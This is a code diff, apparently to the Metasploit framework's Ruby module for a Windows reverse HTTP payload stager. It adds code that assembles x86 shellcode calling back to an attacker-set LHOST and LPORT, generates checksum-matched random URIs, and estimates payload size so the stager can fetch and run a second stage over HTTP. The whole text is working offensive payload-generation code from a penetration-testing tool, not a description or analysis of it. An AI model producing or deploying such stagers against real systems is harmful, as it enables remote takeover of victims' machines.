@@ -19,6 +19,109 @@ module Payload::Windows::ReverseHttp
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 
+  #
+  # Register reverse_http specific options
+  #
+  def initialize(*args)
+    super
+    register_advanced_options(
+      [
+        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
+      ], self.class)
+  end
+
+  #
+  # Generate the first stage
+  #
+  def generate
+    # Generate the simple version of this stager if we don't have enough space
+    if self.available_space.nil? || required_space > self.available_space
+      return generate_reverse_http(
+        ssl:  false,
+        host: datastore['LHOST'],
+        port: datastore['LPORT'],
+        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW))
+    end
+
+    conf = {
+      ssl:  false,
+      host: datastore['LHOST'],
+      port: datastore['LPORT'],
+      url:  generate_uri,
+      exitfunk: datastore['EXITFUNC']
+    }
+
+    generate_reverse_http(conf)
+  end
+
+  #
+  # Generate and compile the stager
+  #
+  def generate_reverse_http(opts={})
+    combined_asm = %Q^
+      cld                    ; Clear the direction flag.
+      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
+      #{asm_block_api}
+      start:
+        pop ebp
+      #{asm_reverse_http(opts)}
+    ^
+    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
+  end
+
+  # TODO: Use the CachedSize instead (PR #4894)
+  def cached_size
+    321
+  end
+
+  #
+  # Generate the URI for the initial stager
+  #
+  def generate_uri
+    # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
+    uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
+
+    if datastore['HTTPStagerURILength']
+      uri_req_len = datastore['HTTPStagerURILength'].to_i
+
+      if uri_req_len > uri_max_len
+        raise ArgumentError, "Maximum HTTPStagerURILength is #{uri_max_len}"
+      end
+
+      if uri_req_len < 5
+        raise ArgumentError, "Minimum HTTPStagerURILength is 5"
+      end
+
+      return "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, uri_req_len)
+    end
+
+    # Generate a random 30+ byte URI
+    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
+  end
+
+  #
+  # Determine the maximum amount of space required for the features requested
+  #
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
+
+    # Add 100 bytes for the encoder to have some room
+    space += 100
+
+    # Add 251 bytes for large URI support (technically a little less, but lets go with it)
+    space += 251
+
+    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
+    space += 31
+
+    # The final estimated size
+    space
+  end
+
+  #
+  # Dynamic payload generation
+  #
   def asm_reverse_http(opts={})
 
     #
@@ -218,6 +321,20 @@ module Payload::Windows::ReverseHttp
         asm << asm_exitfunk(opts)
       end
     asm
+  end
+
+  #
+  # Do not transmit the stage over the connection.  We handle this via HTTPS
+  #
+  def stage_over_connection?
+    false
+  end
+
+  #
+  # Always wait at least 20 seconds for this payload (due to staging delays)
+  #
+  def wfs_delay
+    20
   end
 
 
